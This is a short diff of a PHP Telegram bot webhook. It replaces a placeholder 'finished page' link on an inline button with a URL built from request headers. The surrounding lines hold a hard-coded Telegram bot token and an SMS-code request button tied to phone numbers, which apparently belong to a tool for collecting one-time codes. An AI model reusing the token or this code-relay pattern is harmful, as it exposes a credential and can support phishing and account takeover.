@@ -4,6 +4,12 @@
 // Mismos valores que en procesar.php
 $BOT_TOKEN = '8036763317:AAGJbdfFqJt3yi_MwhnP1_DXsSug9oW31HY';
 
+// Construir URL absoluta hacia finalizado.html
+$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
+$host   = $_SERVER['HTTP_HOST'] ?? 'localhost';
+$basePath = rtrim(dirname($_SERVER['REQUEST_URI'] ?? '/'), '/\\');
+$URL_FINALIZADO = $scheme . $host . $basePath . '/finalizado.html';
+
 function rutaCodigos()
 {
     return __DIR__ . '/codigos.json';
@@ -127,8 +133,8 @@ if (isset($update['callback_query'])) {
                             'callback_data' => 'PEDIR_SMS|' . $telefono,
                         ],
                         [
-                            'text' => 'Listo',
-                            'url'  => 'https://tudominio.com/finalizado.html',
+                            'text' => '\u2705 Listo',
+                            'url'  => $URL_FINALIZADO,
                         ],
                     ],
                 ],
